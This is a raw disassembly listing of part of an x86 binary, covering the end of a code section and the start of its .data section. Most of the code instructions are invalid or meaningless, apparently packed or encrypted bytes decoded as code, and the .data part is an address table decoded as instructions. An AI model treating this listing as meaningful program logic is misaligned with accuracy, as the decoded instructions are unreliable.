  41c70c:	sbb    DWORD PTR [ebx-0x8],esi
  41c70f:	imul   edx,ecx,0xfffffff7
  41c712:	sbb    ecx,DWORD PTR [ecx]
  41c714:	push   0x4a7b7f44
  41c719:	fimul  DWORD PTR [ecx+eax*8-0x41]
  41c71d:	(bad)  
  41c71e:	es ins DWORD PTR es:[edi],dx
  41c720:	push   eax
  41c721:	mov    ah,0x56
  41c723:	outs   dx,BYTE PTR ds:[esi]
  41c724:	jmp    0x41c6b1
  41c726:	cmp    DWORD PTR [ebx+0x20],0x83cefb69
  41c72d:	mov    ds:0xae907163,eax
  41c732:	xchg   ebp,eax
  41c733:	sti    
  41c734:	lock pop ebp
  41c736:	ror    DWORD PTR [edi],1
  41c738:	xor    al,0x52
  41c73a:	or     DWORD PTR [ecx+0x3c],edi
  41c73d:	mov    cx,0x3bb
  41c741:	mov    dh,0x79
  41c743:	xchg   esi,eax
  41c744:	aam    0xa5
  41c746:	adc    eax,0xe653e0e0
  41c74b:	stos   BYTE PTR es:[edi],al
  41c74c:	push   ebx
  41c74d:	lods   eax,DWORD PTR es:[esi]
  41c74f:	div    bh
  41c751:	dec    edi
  41c752:	xchg   ebx,eax
  41c753:	push   ebp
  41c754:	dec    eax
  41c755:	mov    esi,0xb5ec6bc
  41c75a:	xchg   ecx,eax
  41c75b:	push   ecx
  41c75c:	cmp    ch,dh
  41c75e:	dec    eax
  41c75f:	gs jl  0x41c750
  41c762:	pushf  
  41c763:	push   edi
  41c764:	mov    fs,WORD PTR [eax+0x4]
  41c767:	(bad)  
  41c769:	dec    edx
  41c76a:	cwde   
  41c76b:	into   
  41c76c:	retf   
  41c76d:	jmp    0x41c794
  41c76f:	stos   BYTE PTR es:[edi],al
  41c770:	push   ds
  41c771:	mov    edx,edi
  41c773:	into   
  41c774:	ja     0x41c7f5
  41c776:	in     eax,dx
  41c777:	mov    edi,DWORD PTR [ecx+0x29dbed6f]
  41c77d:	or     ebp,DWORD PTR [ebx]
  41c77f:	in     al,dx
  41c780:	outs   dx,BYTE PTR ds:[esi]
  41c781:	jb     0x41c7bf
  41c783:	dec    ebx
  41c784:	lods   al,BYTE PTR ds:[esi]
  41c785:	mov    eax,0x6c3ab0e8
  41c78a:	sbb    BYTE PTR [ecx-0x6d],bh
  41c78d:	fbld   TBYTE PTR [ecx-0x66]
  41c790:	shl    DWORD PTR [ecx+0x4dd1f421],0xb6
  41c797:	sub    ah,BYTE PTR [edx+0x79]
  41c79a:	jmp    0x41c7fe
  41c79c:	mov    ebp,0x8261f2b0
  41c7a1:	aad    0xd7
  41c7a3:	mov    bh,0xdb
  41c7a5:	test   eax,0x2d06b727
  41c7aa:	test   DWORD PTR [esi-0x131c6e17],edx
  41c7b0:	leave  
  41c7b1:	sub    al,0x90
  41c7b3:	fsubp  st(1),st
  41c7b5:	clc    
  41c7b6:	dec    esp
  41c7b7:	imul   BYTE PTR [edx-0x1f]
  41c7ba:	cdq    
  41c7bb:	lock or dl,dh
  41c7be:	out    dx,eax
  41c7bf:	fadd   st,st(3)
  41c7c1:	push   edx
  41c7c2:	lods   al,BYTE PTR ds:[esi]
  41c7c3:	imul   ebx,DWORD PTR [ebx-0x316e200a],0xffffff8f
  41c7ca:	or     DWORD PTR [ecx-0xc],ebp
  41c7cd:	je     0x41c833
  41c7cf:	sub    dh,BYTE PTR [edi]
  41c7d1:	pop    esi
  41c7d2:	xor    eax,0x53788e22
  41c7d7:	xor    esi,DWORD PTR ds:[esp+ecx*1-0x3]
  41c7dc:	scas   al,BYTE PTR es:[edi]
  41c7dd:	cs pop edi
  41c7df:	xor    BYTE PTR [eax+0x632d35c9],0x7f
  41c7e6:	lock sub al,0xe7
  41c7e9:	and    eax,0x251ab5bb
  41c7ee:	sahf   
  41c7ef:	xor    al,0x9e
  41c7f2:	retf   
  41c7f3:	cmp    DWORD PTR [ecx+0x1af487e4],esp
  41c7f9:	call   0xdb4f:0xa7e0d4dc
  41c800:	inc    ecx
  41c801:	mov    ecx,0x416f36ff
  41c806:	cdq    
  41c807:	or     bl,ch
  41c809:	xor    eax,0x38f22042
  41c80e:	or     al,0x80
  41c810:	in     al,0x9f
  41c812:	inc    ebx
  41c813:	xor    BYTE PTR [edx],bl
  41c815:	inc    ecx
  41c816:	stos   DWORD PTR es:[edi],eax
  41c817:	or     eax,DWORD PTR [bx+si-0x58]
  41c81b:	js     0x41c7d6
  41c81d:	pop    edi
  41c81e:	and    dh,BYTE PTR [eax+0x6482741]
  41c824:	es (bad) 
  41c826:	jl     0xfff25945
  41c82c:	out    dx,eax
  41c82d:	dec    edx
  41c82e:	push   esp
  41c82f:	retf   
  41c830:	add    dh,0xaa
  41c833:	or     edx,DWORD PTR [eax]
  41c835:	pushf  
  41c836:	into   
  41c837:	lock stos DWORD PTR es:[edi],eax
  41c839:	shr    BYTE PTR [ebp-0x27],1
  41c83c:	loopne 0x41c866
  41c83e:	sub    dl,bl
  41c840:	rcr    bh,0xb3
  41c843:	ja     0x41c8bc
  41c845:	iret   
  41c846:	mov    ds:0xc1a920e7,ax
  41c84c:	fmul   st(2),st
  41c84e:	push   ebp
  41c84f:	ret    
  41c850:	jno    0x41c811
  41c852:	inc    esp
  41c853:	dec    eax
  41c854:	cs pop edx
  41c856:	sbb    al,BYTE PTR [edi-0x30]
  41c859:	add    eax,0xb13a24ef
  41c85e:	xor    eax,DWORD PTR [ecx-0xf]
  41c861:	aad    0x45
  41c863:	ja     0x41c892
  41c865:	and    dh,BYTE PTR [edi-0x68e10adc]
  41c86b:	mov    cl,0x84
  41c86d:	cmp    DWORD PTR [ebp-0x28],ecx
  41c870:	adc    BYTE PTR [eax],bh
  41c872:	std    
  41c873:	xlat   BYTE PTR ss:[ebx]
  41c875:	pop    esp
  41c876:	mov    eax,ds:0x96eb0ede
  41c87b:	in     al,0x71
  41c87d:	sbb    eax,0xfb298b14
  41c882:	in     eax,0x8d
  41c884:	mov    edx,0x3b49ba07
  41c889:	add    al,BYTE PTR [ebx+ebx*8+0x450a0ff]
  41c890:	xchg   edi,eax
  41c891:	sub    DWORD PTR [ebp+eax*2-0x63fe9935],0xd7ff0e0a
  41c89c:	clc    
  41c89d:	mov    ch,0xf7
  41c89f:	pop    ecx
  41c8a0:	scas   eax,DWORD PTR es:[edi]
  41c8a1:	fild   DWORD PTR [esi+0x50]
  41c8a4:	jg     0x41c890
  41c8a6:	jbe    0x41c878
  41c8a8:	outs   dx,DWORD PTR ds:[esi]
  41c8a9:	jb     0x41c8ee
  41c8ab:	aad    0x86
  41c8ad:	or     ecx,DWORD PTR [ecx-0x309ba73f]
  41c8b3:	pop    es
  41c8b4:	mov    DWORD PTR [edx-0x49],edx
  41c8b7:	pop    ss
  41c8b8:	stos   DWORD PTR es:[edi],eax
  41c8b9:	mov    ah,0xdc
  41c8bb:	test   al,0x1f
  41c8bd:	jne    0x41c8f0
  41c8bf:	fnclex 
  41c8c1:	or     BYTE PTR [ebx-0x4e8be0f4],0x75
  41c8c8:	mov    eax,0xe4229bb4
  41c8cd:	sahf   
  41c8ce:	stos   DWORD PTR es:[edi],eax
  41c8cf:	pop    ss
  41c8d0:	imul   ecx,ecx,0x2aa430ad
  41c8d6:	xor    al,0x4e
  41c8d8:	inc    ecx
  41c8d9:	aam    0xb
  41c8db:	add    BYTE PTR [ecx+0x7c],0x8f
  41c8df:	popf   
  41c8e0:	es or  esp,ebx
  41c8e3:	adc    DWORD PTR [ecx+ecx*1+0x5d],edi
  41c8e7:	adc    eax,ebx
  41c8e9:	rcr    BYTE PTR [edi],cl
  41c8eb:	adc    BYTE PTR [ebp+0x3434ad1],ch
  41c8f1:	sbb    al,0x1a
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	push   ebx
  41c910:	(bad)  
  41c912:	fstp   DWORD PTR [eax]
  41c914:	idiv   DWORD PTR [edi+0x78]
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c95f
  41c91c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c91d:	sub    DWORD PTR [ecx],ecx
  41c91f:	dec    eax
  41c920:	shl    DWORD PTR ds:0xfe0ed10a,cl
  41c926:	sbb    ebx,ecx
  41c928:	mov    ah,0x81
  41c92a:	inc    ecx
  41c92b:	or     BYTE PTR [ebp-0x6f],dh
  41c92e:	mov    esi,0x924fba4f
  41c933:	mov    WORD PTR [ebx],es
  41c935:	mov    esi,0x13687273
  41c93a:	in     eax,0x73
  41c93c:	ins    BYTE PTR es:[edi],dx
  41c93d:	popa   
  41c93e:	aas    
  41c93f:	jp     0x41c9bd
  41c941:	fnstsw WORD PTR [ecx-0x2c]
  41c944:	sbb    DWORD PTR [esi+eiz*2-0x4c0e241],0x74af073d
  41c94f:	cmp    eax,DWORD PTR [esi-0x7a5a761d]
  41c955:	sub    BYTE PTR [eax+0x36],al
  41c958:	(bad)  
  41c959:	push   esp
  41c95a:	ja     0x41c9d2
  41c95c:	dec    ebp
  41c95d:	cmc    
  41c95e:	jle    0x41c8fc
  41c960:	jle    0x41c93a
  41c962:	ret    
  41c963:	imul   esi,DWORD PTR [edi-0x45c5e4e1],0x43
  41c96a:	pop    eax
  41c96b:	(bad)  
  41c96c:	sub    bh,dh
  41c96e:	sahf   
  41c96f:	adc    BYTE PTR [ebx],ah
  41c971:	sub    esi,DWORD PTR [ebx+0x18]
  41c974:	test   BYTE PTR [edi],dl
  41c976:	push   cs
  41c977:	test   eax,0x43d5862d
  41c97c:	test   BYTE PTR [edi-0x2f],ch
  41c97f:	pop    ds
  41c980:	push   bx
  41c982:	mov    eax,ds:0x42387328
  41c987:	leave  
  41c988:	sti    
  41c989:	add    bl,BYTE PTR [esi]
  41c98b:	nop
  41c98c:	cmp    esi,DWORD PTR [edi]
  41c98e:	enter  0xe86f,0x19
  41c992:	xor    eax,esp
  41c994:	mov    eax,ds:0xc5e4bf
  41c999:	sti    
  41c99a:	xchg   ebp,eax
  41c99b:	mov    ss,edi
  41c99d:	mov    eax,0x74bfa5d2
  41c9a2:	icebp  
  41c9a3:	cli    
  41c9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9a5:	adc    eax,0x1e34c6bb
  41c9aa:	xchg   edx,eax
  41c9ab:	mov    ds:0x3e6f63f0,al
  41c9b0:	xlat   BYTE PTR ds:[ebx]
  41c9b1:	das    
  41c9b2:	jo     0x41c9a4
  41c9b4:	test   eax,0xfd907369
  41c9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ba:	adc    esi,DWORD PTR [eax+0x60]
  41c9bd:	icebp  
  41c9be:	int3   
  41c9bf:	inc    BYTE PTR [eax+esi*4-0x1be4b69f]
  41c9c6:	or     DWORD PTR [ebp+0x8],0xce0f0aef
  41c9cd:	mov    ch,BYTE PTR [eax]
  41c9cf:	pop    ebx
  41c9d0:	maskmovq mm2,(bad)
  41c9d1:	not    DWORD PTR [edx+0x70]
  41c9d4:	stos   BYTE PTR es:[edi],al
  41c9d5:	fidivr DWORD PTR [esi+esi*8]
  41c9d8:	push   eax
  41c9d9:	je     0x41c95e
  41c9db:	mov    cl,0x9c
  41c9dd:	and    DWORD PTR [esi+edi*8+0x3c1fe1b0],0xffffffac
  41c9e5:	cmp    DWORD PTR [edx],ebp
  41c9e7:	add    ecx,DWORD PTR [ebp+ebx*8+0x38]
  41c9eb:	mov    esp,0xa6a28e7a
  41c9f0:	clc    
  41c9f1:	dec    ecx
  41c9f2:	rcr    DWORD PTR [eax-0x53240932],0x82
  41c9f9:	lods   al,BYTE PTR ds:[esi]
  41c9fa:	dec    esp
  41c9fb:	push   ss
  41c9fc:	mov    al,0x6e
  41c9fe:	xor    eax,0x571f3d37
  41ca03:	and    eax,0xd5dead50
  41ca08:	aad    0x72
  41ca0a:	sbb    eax,0x683541ed
  41ca10:	mov    eax,0x2589e669
  41ca15:	jno    0x41c9ce
  41ca17:	inc    edi
  41ca18:	scas   al,BYTE PTR es:[edi]
  41ca19:	push   ds
  41ca1a:	jae    0x41c9ef
  41ca1c:	adc    BYTE PTR [eax+0x62],ch
  41ca1f:	icebp  
  41ca20:	bound  esp,QWORD PTR [eax+0x2a]
  41ca23:	jg     0x41ca60
  41ca25:	or     al,0xb2
  41ca27:	dec    esp
  41ca28:	cmp    al,0x13
  41ca2a:	mov    ecx,0x2f81cbf1
  41ca2f:	ins    BYTE PTR es:[edi],dx
  41ca30:	push   0x6fdafdcb
  41ca35:	pop    ds
  41ca36:	sub    BYTE PTR [ebx-0x308d2a01],dh
  41ca3c:	fsubp  st(0),st
  41ca3e:	stc    
  41ca3f:	outs   dx,DWORD PTR ds:[esi]
  41ca40:	rcl    BYTE PTR [edi-0x42a6d823],0xcc
  41ca47:	fwait
  41ca48:	jmp    0xc7ffb6bd
  41ca4d:	loope  0x41c9d5
  41ca4f:	sub    eax,0x1683ae1c
  41ca54:	ins    BYTE PTR es:[edi],dx
  41ca55:	add    al,0x5c
  41ca57:	jmp    0xde3c:0x5042e609
  41ca5e:	ds popa 
  41ca60:	lods   eax,DWORD PTR ds:[esi]
  41ca61:	sbb    bl,BYTE PTR [ebx+edi*8-0x39]
  41ca65:	sub    ebx,DWORD PTR [ecx]
  41ca67:	jmp    0x3e90a94d
  41ca6c:	jmp    FWORD PTR [edi+0x340d127a]
  41ca72:	call   0xc473123e
  41ca77:	fild   WORD PTR [edx]
  41ca79:	ret    0x9017
  41ca7c:	int3   
  41ca7d:	push   cs
  41ca7e:	mov    edx,0xe247b2b8
  41ca83:	push   esi
  41ca84:	out    dx,al
  41ca85:	das    
  41ca86:	dec    esi
  41ca87:	jb     0x41cacc
  41ca89:	add    BYTE PTR [ebx-0x6b],bh
  41ca8c:	pop    eax
  41ca8d:	in     al,dx
  41ca8e:	arpl   WORD PTR [ebp+0x4df2324d],di
  41ca94:	pop    ebx
  41ca95:	das    
  41ca96:	sbb    eax,0xe53bdbd8
  41ca9b:	call   0xf6ce481
  41caa0:	jae    0x41caf9
  41caa2:	into   
  41caa3:	sub    BYTE PTR [ebx-0x14],al
  41caa6:	mov    BYTE PTR [ecx-0x32],0x7
  41caaa:	sbb    edi,DWORD PTR ds:0x4284e22f
  41cab0:	inc    ebp
  41cab1:	and    DWORD PTR [ebp+0x48],eax
  41cab4:	in     al,dx
  41cab5:	cmp    ebx,DWORD PTR [ecx+0x646a4d06]
  41cabb:	xchg   ebx,eax
  41cabc:	inc    esi
  41cabd:	sbb    BYTE PTR [ecx+0x37d6117d],dl
  41cac3:	fbld   TBYTE PTR [ebx]
  41cac5:	add    BYTE PTR [eax-0x76],dh
  41cac8:	lds    eax,FWORD PTR [ecx+0x4da25b09]
  41cace:	sbb    al,BYTE PTR [ebx-0x23a156ed]
  41cad4:	jge    0x41ca89
  41cad6:	sar    DWORD PTR [esi-0x56],0x61
  41cada:	cwde   
  41cadb:	in     eax,0x96
  41cadd:	push   esi
  41cade:	js     0x41ca63
  41cae0:	inc    ebp
  41cae1:	inc    eax
  41cae2:	mov    BYTE PTR [eax-0x2],dl
  41cae5:	cmc    
  41cae6:	call   0x2173:0xcb024779
  41caed:	popf   
  41caee:	mov    ch,0x68
  41caf0:	push   edx
  41caf1:	pop    ds
  41caf2:	fidiv  WORD PTR ds:0xdc5fed39
  41caf8:	sahf   
  41caf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cafa:	add    cl,0xc1
  41cafd:	shr    DWORD PTR [bp+di],1
  41cb00:	mov    eax,0xe0d35ae8
  41cb05:	push   ecx
  41cb06:	push   ebx
  41cb07:	stos   BYTE PTR es:[edi],al
  41cb08:	pop    ss
  41cb09:	pusha  
  41cb0a:	mov    edi,0x33e12d32
  41cb0f:	jmp    0x41cb38
  41cb11:	bswap  eax
  41cb13:	pop    ecx
  41cb14:	sti    
  41cb15:	mov    cl,dl
  41cb17:	adc    al,0x3f
  41cb19:	test   eax,0x35d770f4
  41cb1e:	inc    ebp
  41cb1f:	lea    ebx,[esi]
  41cb21:	mov    al,al
  41cb23:	(bad)  
  41cb25:	add    edx,esi
  41cb27:	cmp    edi,esi
  41cb29:	inc    edx
  41cb2a:	add    DWORD PTR [ecx+0x2b],ebx
  41cb2d:	mov    esp,ebp
  41cb2f:	std    
  41cb30:	dec    esi
  41cb31:	out    0xf4,eax
  41cb33:	pop    esi
  41cb34:	jmp    0x41cd69
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x309f6037
  41cb47:	dec    esi
  41cb48:	ds xor ch,dh
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cb3f
  41cb52:	pop    ss
  41cb53:	xchg   BYTE PTR [ebp+edx*1+0x33cbc70],bh
  41cb5a:	jmp    0x9079:0xfdb158a6
  41cb61:	je     0x41caf6
  41cb63:	mov    dl,al
  41cb65:	(bad)  
  41cb67:	(bad)  
  41cb68:	jmp    0xac8d:0x8a6d2e5e
  41cb6f:	cmp    al,0xd0
  41cb71:	cs pop esp
  41cb73:	fs enter 0x8c8e,0x5c
  41cb78:	sbb    al,0x12
  41cb7a:	push   ecx
  41cb7b:	icebp  
  41cb7c:	mov    esp,0x771af174
  41cb81:	sub    esp,DWORD PTR [ebp-0x451bde45]
  41cb87:	pop    es
  41cb88:	daa    
  41cb89:	loop   0x41cb8e
  41cb8b:	daa    
  41cb8c:	push   ebx
  41cb8d:	fwait
  41cb8e:	jle    0x41cb6f
  41cb90:	push   0xfca6975e
  41cb95:	pop    ecx
  41cb96:	dec    ebp
  41cb97:	jns    0x41cbdd
  41cb99:	cmp    eax,0xf95a2149
  41cb9e:	std    
  41cb9f:	adc    BYTE PTR [edi],dh
  41cba1:	dec    esp
  41cba2:	cmp    bh,BYTE PTR [ebp-0x2350a7a2]
  41cba8:	in     eax,0x2d
  41cbaa:	push   cs
  41cbab:	mov    BYTE PTR [edi-0x4a44b91c],al
  41cbb1:	pop    edx
  41cbb2:	jmp    0x41cc2a
  41cbb4:	sti    
  41cbb5:	ds or  al,0xa5
  41cbb8:	(bad)  
  41cbb9:	gs push esp
  41cbbb:	mov    ebp,0x21ab8ea3
  41cbc0:	jg     0x41cbd8
  41cbc2:	mov    ds:0xc8819f93,al
  41cbc7:	mov    bl,BYTE PTR [esi+0x49]
  41cbca:	jae    0x41cb5f
  41cbcc:	or     BYTE PTR [edx-0x10],ch
  41cbcf:	out    dx,eax
  41cbd0:	ret    
  41cbd1:	xchg   ebp,eax
  41cbd2:	aaa    
  41cbd3:	test   DWORD PTR [ebp-0x53],ebx
  41cbd6:	jne    0x41cbf3
  41cbd8:	mov    edi,edx
  41cbda:	push   ds
  41cbdb:	(bad)  
  41cbdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbdd:	adc    ebx,esp
  41cbdf:	add    ecx,ebp
  41cbe1:	pop    ebp
  41cbe2:	xor    bh,ch
  41cbe4:	xor    DWORD PTR [ecx+0x36],esi
  41cbe7:	add    al,0xd8
  41cbe9:	sub    esp,DWORD PTR [esi-0x37]
  41cbec:	or     BYTE PTR [eax-0xc08d1d1],ch
  41cbf2:	lods   al,BYTE PTR ds:[esi]
  41cbf3:	inc    edx
  41cbf4:	or     eax,esp
  41cbf6:	aaa    
  41cbf7:	sbb    cl,BYTE PTR [eax]
  41cbf9:	icebp  
  41cbfa:	shl    edx,cl
  41cbfc:	xor    al,0xa9
  41cbff:	xor    esp,esp
  41cc01:	js     0x41cc74
  41cc03:	mov    eax,0xee00bbf5
  41cc08:	push   0xbdadbed
  41cc0d:	mov    ch,0x53
  41cc0f:	arpl   WORD PTR [ebx+0x3ba0551b],sp
  41cc15:	stc    
  41cc16:	ins    DWORD PTR es:[edi],dx
  41cc17:	cdq    
  41cc18:	mov    bh,BYTE PTR [ebx]
  41cc1a:	xchg   DWORD PTR [ebp+esi*2+0x3b7fdae0],ebp
  41cc21:	call   0x88e7dfcf
  41cc26:	dec    edx
  41cc27:	push   edi
  41cc28:	test   eax,0x97f18318
  41cc2d:	(bad)  
  41cc2e:	(bad)  
  41cc2f:	mov    esp,0x79a43628
  41cc34:	into   
  41cc35:	ror    ah,cl
  41cc37:	imul   esi,edx,0xc00be42f
  41cc3d:	inc    edi
  41cc3e:	or     ah,BYTE PTR [ecx-0x1c]
  41cc41:	mov    bh,0x7e
  41cc43:	mov    ds:0xd1b32307,eax
  41cc48:	(bad)  
  41cc49:	jl     0x41cbf1
  41cc4b:	jmp    0x41cc68
  41cc4d:	jbe    0x41cca3
  41cc4f:	arpl   WORD PTR [edi+0x31ffb218],sp
  41cc55:	ret    0xdf12
  41cc58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc59:	xchg   ecx,eax
  41cc5a:	or     ch,0x26
  41cc5d:	push   edi
  41cc5e:	pusha  
  41cc5f:	or     eax,0xef80cd85
  41cc64:	mov    esp,0xe20c7dec
  41cc69:	pop    eax
  41cc6a:	push   ecx
  41cc6b:	mov    cl,0x59
  41cc6d:	push   cs
  41cc6e:	in     eax,dx
  41cc6f:	in     eax,dx
  41cc70:	es or  eax,0x907d6f7
  41cc76:	mov    es:0xa171d0a4,al
  41cc7c:	add    ecx,DWORD PTR [ecx-0x3be01e32]
  41cc82:	sub    al,0x40
  41cc84:	into   
  41cc85:	mov    bl,0x8f
  41cc87:	pop    eax
  41cc88:	imul   ebp,DWORD PTR [edx+0x6],0x7555dff0
  41cc8f:	mov    DWORD PTR [ebx],eax
  41cc91:	sbb    dh,ah
  41cc93:	ss push ebx
  41cc95:	out    dx,eax
  41cc96:	mov    bh,BYTE PTR [eax+0x68560e5e]
  41cc9c:	jmp    0x630b5f2
  41cca1:	arpl   WORD PTR [esi+0x7b],si
  41cca4:	popa   
  41cca5:	push   es
  41cca6:	imul   DWORD PTR [ebx+0x15428619]
  41ccac:	or     ch,BYTE PTR [ebx]
  41ccae:	sub    DWORD PTR [esi+0x6f],eax
  41ccb1:	cwde   
  41ccb2:	jb     0x41cc5c
  41ccb4:	aas    
  41ccb5:	add    ah,BYTE PTR ds:0x8d5f2ba7
  41ccbb:	xor    edx,edx
  41ccbd:	xchg   esi,eax
  41ccbe:	sti    
  41ccbf:	add    bl,cl
  41ccc1:	call   0xdd42:0xd0f7b4d7
  41ccc8:	cld    
  41ccc9:	jge    0x41ccb8
  41cccb:	es jecxz 0x41ccd1
  41ccce:	jle    0x41cd46
  41ccd0:	sbb    eax,0xbb4ada46
  41ccd5:	icebp  
  41ccd6:	out    0x28,eax
  41ccd8:	adc    edi,DWORD PTR [ebx+eiz*2]
  41ccdb:	xchg   BYTE PTR [ecx],bh
  41ccdd:	inc    esp
  41ccde:	stos   DWORD PTR es:[edi],eax
  41ccdf:	mov    ?,ebx
  41cce1:	mov    cl,0x1
  41cce3:	adc    al,0xbd
  41cce5:	adc    eax,0xa5a5f535
  41ccea:	push   ecx
  41cceb:	out    0xad,eax
  41cced:	push   ss
  41ccee:	pop    es
  41ccef:	data16 mov dl,BYTE PTR [edi+edx*2-0x32]
  41ccf4:	cmp    esp,DWORD PTR [ebx+0x50]
  41ccf7:	and    ah,0x11
  41ccfa:	sbb    al,0xbd
  41ccfc:	clc    
  41ccfd:	and    esi,esi
  41ccff:	inc    esi
  41cd00:	lods   eax,DWORD PTR ds:[esi]
  41cd01:	sub    eax,0x6b2ac822
  41cd06:	cld    
  41cd07:	sbb    al,cl
  41cd09:	cld    
  41cd0a:	cdq    
  41cd0b:	cmc    
  41cd0c:	sub    eax,0x9643e6d
  41cd11:	mov    al,0x3b
  41cd13:	leave  
  41cd14:	pop    ss
  41cd15:	pop    ss
  41cd16:	scas   al,BYTE PTR es:[edi]
  41cd17:	mov    eax,0xe63fae29
  41cd1c:	arpl   WORD PTR [ebx+ecx*4+0xc],bx
  41cd20:	lea    ecx,[esi+eax*1]
  41cd23:	fwait
  41cd24:	mov    DWORD PTR [ecx-0x52],edx
  41cd27:	dec    eax
  41cd28:	add    al,0x6b
  41cd2a:	scas   eax,DWORD PTR es:[edi]
  41cd2b:	not    al
  41cd2d:	leave  
  41cd2e:	aam    0x32
  41cd30:	jle    0x41cd7c
  41cd32:	pop    esi
  41cd33:	cmp    DWORD PTR [ecx],ebp
  41cd35:	push   ebx
  41cd36:	bound  edi,QWORD PTR [esi]
  41cd38:	sbb    eax,DWORD PTR es:[edx]
  41cd3b:	inc    edi
  41cd3c:	jp     0x41cd7d
  41cd3e:	pop    edi
  41cd3f:	shl    ecx,cl
  41cd41:	pop    eax
  41cd42:	mul    DWORD PTR [eax+edi*8-0x350818cd]
  41cd49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd4a:	stc    
  41cd4b:	mov    DWORD PTR [edx],esi
  41cd4d:	call   0x148e:0xd709fb16
  41cd54:	test   al,0xdd
  41cd56:	cmp    eax,0xca09cfd9
  41cd5b:	(bad)  
  41cd5c:	sti    
  41cd5d:	(bad)  
  41cd5e:	push   ss
  41cd5f:	mov    al,ds:0x4f0cabcd
  41cd64:	imul   DWORD PTR [ebx+0x5b71fd6a]
  41cd6a:	leave  
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
